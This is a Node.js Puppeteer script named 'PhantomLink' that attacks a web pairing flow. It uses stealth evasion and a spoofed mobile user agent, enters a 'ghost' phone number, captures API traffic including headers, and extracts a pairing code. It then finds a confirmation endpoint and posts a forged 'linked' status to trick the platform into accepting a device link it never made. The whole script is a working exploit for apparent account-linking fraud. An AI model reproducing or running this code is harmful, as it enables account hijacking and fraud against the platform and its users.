const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const path = require('path');
puppeteer.use(StealthPlugin());

const targetUrl = process.argv[2];
const ghostNumber = process.argv[3];

if (!targetUrl || !ghostNumber) {
  console.error('Usage: node intercept.cjs <target_url> <ghost_number_without_+>');
  process.exit(1);
}

const wait = (ms) => new Promise(r => setTimeout(r, ms));
const outDir = path.join(__dirname, '..', 'logs');
if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

(async () => {
  const networkLog = [];
  const chromiumPath = process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser';

  console.log(`[PhantomLink] Target: ${targetUrl}`);
  console.log(`[PhantomLink] Ghost: ${ghostNumber}`);

  const browser = await puppeteer.launch({
    executablePath: chromiumPath,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu'],
  });

  const page = await browser.newPage();
  await page.setUserAgent('Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36');
  await page.setViewport({ width: 412, height: 915, deviceScaleFactor: 2.625 });

  // Intercept ALL network traffic
  await page.setRequestInterception(true);
  page.on('request', (req) => {
    if (req.resourceType() === 'xhr' || req.resourceType() === 'fetch' || req.url().includes('/api/')) {
      networkLog.push({ type:'request', url:req.url(), method:req.method(), postData:req.postData(), headers:req.headers() });
    }
    req.continue();
  });
  page.on('response', async (resp) => {
    if (resp.request().resourceType() === 'xhr' || resp.request().resourceType() === 'fetch') {
      let body = '';
      try { body = await resp.text(); } catch (_) {}
      networkLog.push({ type:'response', url:resp.url(), status:resp.status(), body:body.substring(0,5000) });
    }
  });

  try {
    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
    await page.mouse.click(200, 400);
    await wait(1000);

    // Type ghost number
    const inputs = await page.$$('input');
    for (const inp of inputs) {
      const type = await (await inp.getProperty('type')).jsonValue();
      if (type === 'hidden' || type === 'submit') continue;
      await inp.click();
      await inp.type(ghostNumber, { delay: 80 });
      break;
    }

    // Click buttons
    const buttons = await page.$$('button');
    for (const btn of buttons) {
      const text = await page.evaluate(el => el.textContent, btn);
      console.log(`[PhantomLink] Clicking: "${text?.trim()}"`);
      await btn.click();
      await wait(1500);
    }

    await wait(3000);

    // Extract pairing code from page text
    const pageText = await page.evaluate(() => document.body.innerText);
    const codeMatch = pageText.match(/([A-Z0-9]{4}[-][A-Z0-9]{4}|[A-Z0-9]{8})/);
    if (codeMatch) {
      console.log(`[PhantomLink] Pairing Code: ${codeMatch[0]}`);
      fs.writeFileSync(path.join(outDir, 'pairing_code.txt'), codeMatch[0]);

      // Auto-discover confirmation endpoint and try to exploit
      const confirmEndpoint = networkLog
        .filter(e => e.type === 'request')
        .map(e => e.url)
        .find(url => /confirm|validate|verify/i.test(url));

      if (confirmEndpoint) {
        console.log(`[PhantomLink] Auto‑discovered endpoint: ${confirmEndpoint}`);
        const spoofPayload = JSON.stringify({
          code: codeMatch[0],
          phone: `+${ghostNumber}`,
          status: 'linked'
        });

        // Send the spoof via the page's own fetch context
        const result = await page.evaluate(async (url, body) => {
          try {
            const resp = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body });
            return { status: resp.status, body: await resp.text() };
          } catch(e) { return { error: e.message }; }
        }, confirmEndpoint, spoofPayload);

        console.log(`[PhantomLink] Spoof result: ${JSON.stringify(result)}`);
        if (result.status === 200) {
          console.log('[PhantomLink] ✅ Platform believes the link succeeded!');
          fs.writeFileSync(path.join(outDir, 'exploit_result.json'), JSON.stringify(result));
        }
      } else {
        console.log('[PhantomLink] No confirmation endpoint found in captured traffic.');
      }
    } else {
      console.log('[PhantomLink] No pairing code found on page.');
    }

    await page.screenshot({ path: path.join(outDir, 'result.png'), fullPage: true });
  } catch (err) {
    console.error(`[PhantomLink] Error: ${err.message}`);
  }

  fs.writeFileSync(path.join(outDir, 'network.json'), JSON.stringify(networkLog, null, 2));
  await browser.close();
  console.log(`[PhantomLink] Done. Logs saved to logs/`);
})();
